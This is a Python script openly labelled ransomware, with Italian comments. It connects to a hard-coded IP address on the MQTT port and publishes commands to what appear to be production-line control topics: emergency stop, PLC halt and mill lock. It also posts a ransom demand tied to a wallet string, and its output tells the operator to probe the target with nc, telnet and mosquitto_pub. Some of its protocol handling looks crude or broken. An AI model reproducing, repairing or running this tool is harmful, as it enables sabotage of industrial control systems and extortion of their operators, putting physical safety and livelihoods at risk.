#!/usr/bin/env python3
# MIL_RANSOMWARE_v6.0 - TRUSTEDF57 (ANTI-RESET + SLOW ATTACK)
import socket, time, base64, os, json
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding

class MilitaryRansomware:
    def __init__(self):
        self.ip = "67.218.246.15"
        self.port = 1883
        self.wallet = "STAMMATIN-O-TENG-TUOST"
        
        self.key = b"TRUSTEDF57KEY256BIT1234567890123456789012345678901234567890123456"[:32]
        self.iv = b"TRUSTEDF57IV1234567890123456"[:16]
        
        open("key_v6.aes", "wb").write(self.key + self.iv)
        print("[KEY] key_v6.aes OK")
    
    def stealth_encrypt(self, data):
        try:
            padder = padding.PKCS7(128).padder()
            padded = padder.update(data) + padder.finalize()
            cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv))
            enc = cipher.encryptor()
            return base64.b64encode(enc.update(padded) + enc.finalize()).decode()
        except:
            return base64.b64encode(data).decode()
    
    def slow_connect_publish(self, topic, payload):
        """Connessione LENTA anti-reset"""
        for attempt in range(3):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                sock.settimeout(10)
                
                print(f"[{attempt+1}/3] Connect {topic[:30]}...")
                sock.connect((self.ip, self.port))
                
                # CONNECT lento
                cid = f"t57_{int(time.time())}_{attempt}".encode()
                connect = (
                    b"\x10" + bytes([0x1D]) +  # Fixed length
                    b"\x00\x04MQTT\x04\xC2\x00\x12" +  # Protocol
                    bytes([len(cid)]) + cid
                )
                sock.send(connect)
                time.sleep(1)
                connack = sock.recv(1024)
                print(f"  CONNACK: {len(connack)} bytes")
                
                # PUBLISH lento
                enc = self.stealth_encrypt(payload)
                tlen = len(topic.encode())
                plen = len(enc.encode())
                total_len = 2 + tlen + plen
                
                publish = (
                    bytes([0x30, total_len]) +           # Header
                    bytes([tlen]) + topic.encode() +     # Topic
                    enc.encode()                         # Payload
                )
                
                sock.send(publish)
                time.sleep(2)
                resp = sock.recv(1024)
                sock.close()
                
                print(f"✅ HIT -> {topic[:25]}...")
                return True
                
            except Exception as e:
                print(f"  ❌ Tentativo {attempt+1}: {e}")
                time.sleep(3)
        
        return False
    
    def full_attack(self):
        """Attack sequenziale LENTO"""
        print("\n🐌 SLOW STEALTH ATTACK IN CORSO...")
        
        critical = [
            ("Linea5ResultsFromCyclicRead/Alarms_DB4", '{"EMERGENCY_STOP":true}'),
            ("Linea4ResultsFromCyclicRead/Alarms_DB4", '{"PLC_HALT":true}'),
            ("MoliendaResultsFromCyclicRead/Plc", '{"MILL_LOCK":true}'),
            ("Linea5ResultsFromCyclicRead/Events", f'{{"RANSOM":"{self.wallet}"}}'),
            ("Linea4ResultsFromCyclicRead/Events", '{"LOCKOUT":"TRUSTEDF57"}'),
            ("$SYS/broker/ransom/TRUSTEDF57", f"DEMAND:{self.wallet}:2.5"),
        ]
        
        hits = 0
        for topic, payload in critical:
            if self.slow_connect_publish(topic, payload):
                hits += 1
            time.sleep(5)  # 5s tra attacchi
        
        print(f"\n🎯 RISULTATO: {hits}/6 CRITICAL HITS")
    
    def test_connection(self):
        """Test base"""
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((self.ip, self.port))
            s.close()
            print("✅ PORTO APERTO")
            return True
        except:
            print("❌ PORTO NON APERTO")
            return False
    
    def run(self):
        print("🔴 TRUSTEDF57 v6.0 - SLOW ANTI-DETECTION 🔴")
        print(f"Target: {self.ip}:{self.port}")
        
        if self.test_connection():
            self.full_attack()
        else:
            print("\n🔧 PROVA QUESTI COMANDI:")
            print("nc -v 67.218.246.15 1883")
            print("telnet 67.218.246.15 1883")
            print("mosquitto_pub -h 67.218.246.15 -t test -m hello")
        
        print("\n⏳ Aspetta 30s e controlla dashboard!")
        time.sleep(30)

if __name__ == "__main__":
    rw = MilitaryRansomware()
    rw.run()
